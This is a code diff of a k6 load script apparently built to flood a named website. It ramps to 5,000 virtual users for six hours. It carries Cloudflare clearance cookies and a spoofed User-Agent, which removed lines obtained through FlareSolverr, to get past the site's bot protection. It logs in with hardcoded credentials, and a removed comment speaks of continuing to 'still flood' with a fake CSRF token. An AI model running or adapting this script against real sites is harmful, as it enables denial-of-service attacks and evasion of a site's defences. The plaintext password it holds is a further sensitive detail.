@@ -13,10 +13,13 @@ import { randomIntBetween, randomItem } from 'https://jslib.k6.io/k6-utils/1.4.0
 
 const IP_URL  = (__ENV.IP_URL   || 'https://thanhhuyreal.com').replace(/\/+$/, '');
 const HOST    = __ENV.SITE_HOST || 'thanhhuyreal.com';
-const FLARESOLVERR_URL = __ENV.FLARESOLVERR_URL || 'https://fs.duongle.dev';
 
 const IDENTIFIER = __ENV.PHP_IDENTIFIER || 'lonussystem';
 const PASSWORD   = __ENV.PHP_PASSWORD   || 'lonussystem123@';
+
+// Cloudflare bypass cookies from env (from FlareSolverr)
+const CF_CLEARANCE = __ENV.CF_CLEARANCE || '';
+const CF_UA = __ENV.CF_UA || 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36';
 
 // ===== Config =====
 const STAGES_RAW  = __ENV.STAGES      || '30s:500,60s:2000,60s:5000,360m:5000';
@@ -32,70 +35,7 @@ const STAGES = STAGES_RAW.split(',').map(p => {
   return { duration: d.trim(), target: parseInt(t, 10) };
 });
 
-// ===== Helper: Get cf_clearance từ FlareSolverr với retry =====
-function getCfClearance(retries = 3) {
-  for (let attempt = 1; attempt <= retries; attempt++) {
-    console.log(`FlareSolverr attempt ${attempt}/${retries}...`);
-    
-    try {
-      const flareRes = http.post(`${FLARESOLVERR_URL}/v1`, 
-        JSON.stringify({
-          cmd: "request.get",
-          url: IP_URL,
-          maxTimeout: 60000
-        }),
-        { 
-          headers: { 'Content-Type': 'application/json' },
-          timeout: '90s',
-        }
-      );
-      
-      if (flareRes.status !== 200) {
-        console.warn(`FlareSolverr HTTP error: ${flareRes.status}`);
-        if (attempt < retries) {
-          sleep(5);
-          continue;
-        }
-        return { cfClearance: '', userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' };
-      }
-      
-      const data = flareRes.json();
-      if (data.status !== 'ok') {
-        console.warn(`FlareSolverr error: ${data.message || 'unknown'}`);
-        if (attempt < retries) {
-          sleep(5);
-          continue;
-        }
-        return { cfClearance: '', userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' };
-      }
-      
-      const cookies = data.solution.cookies || [];
-      const cfCookie = cookies.find(c => c.name === 'cf_clearance');
-      const userAgent = data.solution.userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
-      
-      if (!cfCookie && attempt < retries) {
-        console.warn('No cf_clearance cookie found, retrying...');
-        sleep(5);
-        continue;
-      }
-      
-      return {
-        cfClearance: cfCookie ? cfCookie.value : '',
-        userAgent: userAgent
-      };
-      
-    } catch (err) {
-      console.error(`FlareSolverr request failed: ${err}`);
-      if (attempt < retries) {
-        sleep(5);
-        continue;
-      }
-      return { cfClearance: '', userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' };
-    }
-  }
-  
-  return { cfClearance: '', userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' };
-}
+// No getCfClearance() function - cookies passed via env vars
 
 // ===== Headers chung (dung session + cf_clearance) =====
 function makeHeaders(session, cfClearance, userAgent) {
@@ -168,31 +108,29 @@ const reqErr   = new Counter('req_error');
 const errRate  = new Rate('error_rate');
 const reqDur   = new Trend('req_duration');
 
-// ===== Setup: Get cf_clearance + Login 1 lần =====
+// ===== Setup: Login 1 lần với cf_clearance từ env =====
 export function setup() {
-  console.log('=== SETUP: Get cf_clearance from FlareSolverr ===');
-  console.log(`FlareSolverr: ${FLARESOLVERR_URL}`);
+  console.log('=== SETUP: Login to get PHPSESSID ===');
   console.log(`Target: ${IP_URL}`);
+  console.log(`Username: ${IDENTIFIER}`);
   
-  const { cfClearance, userAgent } = getCfClearance();
-  
-  if (!cfClearance) {
-    console.warn('⚠ No cf_clearance obtained, will try without it');
+  if (!CF_CLEARANCE || CF_CLEARANCE === 'none') {
+    console.warn('⚠ No cf_clearance, will try without it');
   } else {
-    console.log(`✓ cf_clearance: ${cfClearance.substring(0, 50)}...`);
+    console.log(`✓ cf_clearance: ${CF_CLEARANCE.substring(0, 50)}...`);
   }
-  console.log(`User-Agent: ${userAgent.substring(0, 80)}...`);
+  console.log(`User-Agent: ${CF_UA.substring(0, 80)}...`);
   
   // Login để lấy PHPSESSID
-  console.log('=== Auto-login: GET csrf token ===');
+  console.log('=== Step 1: GET login page for CSRF ===');
   
   const loginHeaders = {
-    'User-Agent': userAgent,
+    'User-Agent': CF_UA,
     'Accept': 'text/html,application/xhtml+xml',
   };
   
-  if (cfClearance) {
-    loginHeaders['Cookie'] = `cf_clearance=${cfClearance}`;
+  if (CF_CLEARANCE && CF_CLEARANCE !== 'none') {
+    loginHeaders['Cookie'] = `cf_clearance=${CF_CLEARANCE}`;
   }
   
   const loginPageRes = http.get(`${IP_URL}/?auth=login`, {
@@ -203,32 +141,27 @@ export function setup() {
 
   if (loginPageRes.status !== 200) {
     console.error(`GET login page failed: status=${loginPageRes.status}`);
-    console.error(`Response body preview: ${(loginPageRes.body || '').substring(0, 200)}`);
-    // Vẫn thử login với empty session thay vì return ngay
-    console.warn('Will attempt login anyway without CSRF...');
+    console.error(`Body preview: ${(loginPageRes.body || '').substring(0, 300)}`);
+    return { session: '', cfClearance: CF_CLEARANCE, userAgent: CF_UA };
   }
 
   // Extract csrf_token
-  const csrfMatch = loginPageRes.body ? loginPageRes.body.match(/name="csrf_token"\s+value="([^"]+)"/) : null;
+  const csrfMatch = loginPageRes.body.match(/name="csrf_token"\s+value="([^"]+)"/);
   if (!csrfMatch) {
     console.error('csrf_token not found in HTML');
-    console.error('HTML preview:', (loginPageRes.body || '').substring(0, 500));
-    // Thử dùng fake CSRF thay vì return
-    const csrfToken = '0000000000000000000000000000000000000000000000000000000000000000';
-    console.log(`Using fake CSRF (will likely fail but still flood): ${csrfToken.substring(0, 10)}...`);
-  } else {
-    const csrfToken = csrfMatch[1];
-    console.log(`CSRF: ${csrfToken.substring(0, 10)}...`);
+    return { session: '', cfClearance: CF_CLEARANCE, userAgent: CF_UA };
   }
-  
-  const csrfToken = csrfMatch ? csrfMatch[1] : '0000000000000000000000000000000000000000000000000000000000000000';
+  const csrfToken = csrfMatch[1];
+  console.log(`✓ CSRF: ${csrfToken.substring(0, 20)}...`);
 
   // Extract PHPSESSID
   const cookiesObj = loginPageRes.cookies;
   const phpSessId = (cookiesObj['PHPSESSID'] && cookiesObj['PHPSESSID'][0])
     ? cookiesObj['PHPSESSID'][0].value
     : '';
-  console.log(`PHPSESSID: ${phpSessId ? phpSessId.substring(0, 8) + '...' : 'NOT FOUND'}`);
+  console.log(`✓ PHPSESSID: ${phpSessId ? phpSessId.substring(0, 16) + '...' : 'NOT FOUND'}`);
+
+  console.log('=== Step 2: POST login ===');
 
   // POST login
   const loginBody = [
@@ -238,8 +171,8 @@ export function setup() {
   ].join('&');
 
   let loginCookie = `PHPSESSID=${phpSessId}`;
-  if (cfClearance) {
-    loginCookie += `; cf_clearance=${cfClearance}`;
+  if (CF_CLEARANCE && CF_CLEARANCE !== 'none') {
+    loginCookie += `; cf_clearance=${CF_CLEARANCE}`;
   }
   
   const loginRes = http.post(`${IP_URL}/model/login`, loginBody, {
@@ -248,25 +181,28 @@ export function setup() {
       'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
       'Accept': 'application/json',
       'X-Requested-With': 'XMLHttpRequest',
-      'User-Agent': userAgent,
+      'User-Agent': CF_UA,
       'Referer': `${IP_URL}/?auth=login`,
+      'Origin': IP_URL,
     },
     responseType: 'text',
     timeout: '30s',
   });
 
-  console.log(`Login response status: ${loginRes.status}`);
+  console.log(`Login POST status: ${loginRes.status}`);
 
   let json = null;
   try { json = loginRes.json(); } catch(e) {}
 
   if (json && json.status === true) {
-    console.log(`✓ Login SUCCESS! Session: ${phpSessId.substring(0, 8)}...`);
-    return { session: phpSessId, cfClearance: cfClearance, userAgent: userAgent };
+    console.log(`✓✓✓ LOGIN SUCCESS! ✓✓✓`);
+    console.log(`Session: ${phpSessId.substring(0, 16)}...`);
+    return { session: phpSessId, cfClearance: CF_CLEARANCE, userAgent: CF_UA };
   } else {
-    const msg = json ? JSON.stringify(json) : (loginRes.body || '').substring(0, 100);
-    console.warn(`Login failed: ${msg}`);
-    return { session: phpSessId, cfClearance: cfClearance, userAgent: userAgent };
+    const msg = json ? JSON.stringify(json) : (loginRes.body || '').substring(0, 200);
+    console.warn(`Login response: ${msg}`);
+    console.warn('Will continue anyway - some endpoints may work without full auth');
+    return { session: phpSessId, cfClearance: CF_CLEARANCE, userAgent: CF_UA };
   }
 }
 
